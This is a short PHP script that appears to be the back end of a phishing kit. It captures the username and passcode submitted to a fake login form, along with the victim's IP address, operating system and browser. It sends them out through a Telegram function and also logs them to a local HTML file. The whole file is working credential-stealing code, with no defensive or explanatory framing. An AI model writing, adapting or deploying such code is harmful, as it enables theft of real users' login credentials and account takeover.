<?php
require_once("config.php");
$message = '/-- LOGIN --/' . getIPAddress() . "\r\n";
$message .= '[Username] = ' . $_POST["username"] . "\r\n";
$message .= '[Passcode] = ' . $_POST["passcode"] . "\r\n";
$message .= '[TIME/DATE] = ' . $date . "\r\n";
$message .= '[IP address] = ' . getIPAddress() . "\r\n";
$message .= '[OS] = ' . $user_os . "\r\n";
$message .= '[BROWSER] = ' . $user_browser . "\r\n";
telegram_send(urlencode($message));
$house = fopen('fucked/LOGIN.html', 'a');
fwrite($house, $message);
fclose($house);
?>